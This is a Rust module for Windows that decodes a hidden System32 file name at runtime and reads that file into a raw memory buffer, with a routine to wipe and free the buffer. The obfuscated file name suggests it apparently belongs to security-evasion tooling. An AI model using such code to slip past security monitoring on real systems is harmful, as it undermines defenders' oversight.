use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::{null, null_mut};

use winapi::shared::minwindef::DWORD;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, GetFileSize, ReadFile, OPEN_EXISTING, INVALID_FILE_SIZE};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, GENERIC_READ,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, MEM_RELEASE,
};

use crate::internal::crypto::coder::{decode, ENC};

/// Builds a full path to a file in `System32\` by appending the decoded filename
/// to the `%SystemRoot%\System32\` or `%windir%\System32\` path.
///
/// # Arguments
/// - `encoded`: UTF-16 encoded file name (null-terminated).
///
/// # Returns
/// UTF-16-encoded full path ready to pass to `CreateFileW`.
#[inline(always)]
fn build_sys32_path(encoded: &[u16]) -> Vec<u16> {
    let base = env::var_os("SystemRoot")
        .or_else(|| env::var_os("windir"))
        .unwrap_or_else(|| OsStr::new("C:\\Windows").to_os_string());

    let base_str = base.to_string_lossy();

    let mut full = base_str.encode_utf16().collect::<Vec<u16>>();
    full.push(b'\\' as u16);
    full.extend("System32\\".encode_utf16());

    let len = encoded.iter().position(|&c| c == 0).unwrap_or(encoded.len());
    full.extend_from_slice(&encoded[..len]);
    full.push(0);
    full
}

/// Loads and maps a file from `System32` into memory, returning a read-write buffer.
///
/// The file name is obfuscated and decoded at runtime using the internal `coder::decode()` function.
///
/// # Arguments
/// - `out_size`: pointer to a usize that receives the size of the mapped file.
///
/// # Returns
/// A pointer to the memory buffer containing the file's contents. Returns `None` if any step fails.
///
/// # Safety
/// This function performs raw memory allocation and Windows API calls. Caller must `VirtualFree()`
/// the returned buffer after use using [`zero_and_free()`].
///
/// # Errors
/// Returns `None` on any failure: file not found, bad permissions, allocation failure, etc.
pub unsafe fn buffer(out_size: &mut usize) -> Option<*mut winapi::ctypes::c_void> {
    let decoded = decode(&ENC);
    let path_w = build_sys32_path(&decoded);

    let file = CreateFileW(
        path_w.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ,
        null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    );

    if file == INVALID_HANDLE_VALUE {
        return None;
    }

    let file_size = GetFileSize(file, null_mut());
    if file_size == INVALID_FILE_SIZE || file_size == 0 {
        CloseHandle(file);
        return None;
    }

    let buffer = VirtualAlloc(
        null_mut(),
        file_size as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as *mut winapi::ctypes::c_void;

    if buffer.is_null() {
        CloseHandle(file);
        return None;
    }

    let mut bytes_read: DWORD = 0;
    let read_ok = ReadFile(file, buffer, file_size, &mut bytes_read, null_mut()) != 0;
    CloseHandle(file);

    if !read_ok || bytes_read != file_size {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return None;
    }

    *out_size = file_size as usize;
    Some(buffer)
}

/// Zeroes and frees a memory buffer previously returned by [`buffer()`].
///
/// This function securely overwrites the contents of the memory region before releasing it.
///
/// # Arguments
/// - `buffer`: pointer to memory region
/// - `size`: number of bytes to zero
///
/// # Safety
/// - `buffer` must have been returned by [`VirtualAlloc`] or [`buffer()`]
/// - Undefined behavior if buffer is invalid or not sized correctly
pub unsafe fn zero_and_free(buffer: *mut winapi::ctypes::c_void, size: usize) {
    if !buffer.is_null() {
        let mut ptr = buffer as *mut u64;
        let end = ptr.add(size / 8);
        while ptr < end {
            std::ptr::write_volatile(ptr, 0);
            ptr = ptr.add(1);
        }

        let rem = size % 8;
        if rem > 0 {
            let byte_ptr = end as *mut u8;
            for i in 0..rem {
                std::ptr::write_volatile(byte_ptr.add(i), 0);
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);
    }
}